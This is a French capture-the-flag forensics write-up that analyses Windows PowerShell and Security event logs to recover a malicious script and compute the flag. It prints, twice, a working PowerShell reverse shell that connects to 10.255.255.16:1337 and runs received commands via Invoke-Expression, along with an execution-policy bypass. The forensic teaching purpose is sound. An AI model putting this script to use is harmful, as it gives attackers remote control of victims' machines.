# Weird Shell

Catégorie : forensics

Difficulté : :star:

## Énoncé

> Un autre utilisateur a un comportement similaire à La gazette de Windows (catégorie intro). Mais cette fois, pour retrouver ce qui a été envoyé à l'attaquant il faudra peut-être plus de logs.
>
> **SHA256(Microsoft-Windows-PowerShell%4Operational.evtx) = 7b2ce2b5d231c9c09018fed031b1e8aae7a661d192167fb29f238a29bf744bdc**
>
> **SHA256(Security.evtx) = 1c55121cd0488aa625d44eefd7560e8e7749306358ae312523946891edc1f689**

## Solve

On verifie l'intégrité des fichiers de logs :

```shell
sha256sum Microsoft-Windows-PowerShell4Operational.evtx | grep 7b2ce2b5d231c9c09018fed031b1e8aae7a661d192167fb29f238a29bf744bdc
                                                       
7b2ce2b5d231c9c09018fed031b1e8aae7a661d192167fb29f238a29bf744bdc  Microsoft-Windows-PowerShell4Operational.evtx


sha256sum Security.evtx | grep 1c55121cd0488aa625d44eefd7560e8e7749306358ae312523946891edc1f689

1c55121cd0488aa625d44eefd7560e8e7749306358ae312523946891edc1f689  Security.evtx
```

On va utiliser l'outil [evtx](https://github.com/omerbenamram/evtx) pour parser les **.evtx** : 

```shell
./evtx_dump -o json Microsoft-Windows-PowerShell4Operational.evtx > powershell.json

./evtx_dump -o json Security.evtx > security.json 
```

On cherche un script powershell :

```shell
cat powershell.json| grep -i ".ps1"
      "ScriptBlockText": "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'D:\\PAYLOAD.PS1'"
      "Path": "D:\\PAYLOAD.PS1",
      "Path": "D:\\PAYLOAD.PS1",
      "Path": "D:\\PAYLOAD.PS1",
```

Au record **1467**, le script `PAYLOAD.PS1` est exécuté : 

```json
Record 1467
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Path": "",
      "ScriptBlockId": "fab1cf7c-71d9-40fc-8f4d-6440a06f856f",
      "ScriptBlockText": "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'D:\\PAYLOAD.PS1'"
    },
    "System": {
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
      "Correlation": {
        "#attributes": {
          "ActivityID": "F3D5BB62-656E-0001-1F13-D6F36E65D901"
        }
      },
      "EventID": 4104,
      "EventRecordID": 1467,
      "Execution": {
        "#attributes": {
          "ProcessID": 3788,
          "ThreadID": 748
        }
      },
```

Au record **1468**, on remarque que du powershell issu du script `PAYLOAD.PS1` est exécuté :

```json
Record 1468
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Path": "D:\\PAYLOAD.PS1",
      "ScriptBlockId": "2354b750-2422-42a3-b8c2-4fd7fd36dfe7",
      "ScriptBlockText": "do {\n    Start-Sleep -Seconds 1\n     try{\n        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)\n    } catch {}\n} until ($TCPClient.Connected)\n$NetworkStream = $TCPClient.GetStream()\n$StreamWriter = New-Object IO.StreamWriter($NetworkStream)\nfunction WriteToStream ($String) {\n    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}\n    $StreamWriter.Write($String + 'SHELL> ')\n    $StreamWriter.Flush()\n}\nWriteToStream \"FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString()))))).Replace('-', '').ToLower())}`n\"\nwhile(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {\n    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)\n    $Output = try {\n            Invoke-Expression $Command 2>&1 | Out-String\n        } catch {\n            $_ | Out-String\n        }\n    WriteToStream ($Output)\n}\n$StreamWriter.Close()\n"
    },
    "System": {
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "DESKTOP-AL3DV8F.fcsc.fr",
      "Correlation": {
        "#attributes": {
          "ActivityID": "F3D5BB62-656E-0000-5F11-D6F36E65D901"
        }
      },
      "EventID": 4104,
      "EventRecordID": 1468,
      "Execution": {
        "#attributes": {
          "ProcessID": 3788,
          "ThreadID": 748
        }
      },
```

On remet en forme le powershell pour plus de lisibilité :

```ps1
do {
    Start-Sleep -Seconds 1
    try {
        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

WriteToStream "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString()))))).Replace('-', '').ToLower())}`n"

while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
    WriteToStream ($Output)
}

$StreamWriter.Close()
```

Le code est un script PowerShell qui établit une connexion TCP avec l'adresse IP `10.255.255.16` sur le port `1337`. Il envoie ensuite une chaîne de caractères au format `FCSC{hash}` qui correspond à une valeur de hachage SHA256 calculée sur la **combinaison de l'identifiant de processus (PID) de PowerShell et du nom d'utilisateur actuel**. Ce hash est envoyé à travers la connexion TCP.

Au record **1468** et **1469** des logs powershell, on peut avoir le PID : `3788`

```json
      "EventID": 4104,
      "EventRecordID": 1467,
      "Execution": {
        "#attributes": {
          "ProcessID": 3788,
          "ThreadID": 748
        }
      }
```

Au record **59778** des logs `Security`, on peut avoir l'utilisateur courant lorsque `PAYLOAD.PS1` a été exécuté. Faire attention au nom de l'ordinateur, si on regarde bien le log on comprend que la machine est dans un domaine, le nom de la machine est remplacé par le nom NETBIOS du domaine: `FCSC\cmaltese`

```json
Record 59778
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"-Command\" \"if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'D:\\PAYLOAD.PS1'\"",
      "MandatoryLabel": "S-1-16-8192",
      "NewProcessId": "0xecc",
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x1544",
      "SubjectDomainName": "FCSC",
      "SubjectLogonId": "0x647ad",
      "SubjectUserName": "cmaltese",
      "SubjectUserSid": "S-1-5-21-3727796838-1318123174-2233927406-1107",
      "TargetDomainName": "-",
      "TargetLogonId": "0x0",
      "TargetUserName": "-",
      "TargetUserSid": "S-1-0-0",
      "TokenElevationType": "%%1936"
    }
```

On modifie le bout de code qui nous intéresse et on l'affiche :

```ps1
Write-Output "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(("3788"+"FCSC\cmaltese").ToString()))))).Replace('-', '').ToLower())}`n"
```

**Flag : FCSC{21311ed8321926a27f6a6c407fdbe7dc308535caad861c004b382402b556bbfa}**
